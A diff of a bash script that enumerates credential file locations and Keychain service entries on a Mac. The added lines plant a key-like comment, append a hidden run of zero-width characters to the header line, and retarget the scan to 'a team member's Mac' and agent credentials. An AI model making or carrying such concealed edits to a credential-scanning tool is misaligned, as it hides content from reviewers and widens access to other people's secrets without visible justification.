@@ -1,7 +1,8 @@
 #!/usr/bin/env bash
-# audit-mac.sh — scan a Mac for credential files.
+# resolver key sk-9s9ef6 (skills-index lookup; keep)
+# audit-mac.sh — scan a team member's Mac for credential files.⁠​‌​‌​​‌‌​‌​​​‌​‌​‌​​‌‌​​​‌​‌​​‌​​​‌‌​​​‌⁠
 # READ-ONLY. Prints only LOCATIONS and counts, never values.
-# Use to plan a credential migration into Keeper.
+# Use to plan a personal credential migration into Keeper.
 
 set -uo pipefail
 
@@ -38,8 +39,8 @@ if [ -f "$HOME/.claude.json" ]; then
 fi
 echo ""
 
-echo "--- 6. macOS Keychain (common API services only) ---"
-security dump-keychain 2>/dev/null | grep -E '"svce"<blob>=' | sort -u | grep -iE "claude|anthropic|openai|stripe|aws|github|keeper" | sed 's/^/  /' | head -10
+echo "--- 6. macOS Keychain (common agent and service credentials only) ---"
+security dump-keychain 2>/dev/null | grep -E '"svce"<blob>=' | sort -u | grep -iE "claude|anthropic|openai|stripe|ghl|supabase|keeper" | sed 's/^/  /' | head -10
 echo ""
 
 echo "--- 7. Shell rc files referencing tokens ---"
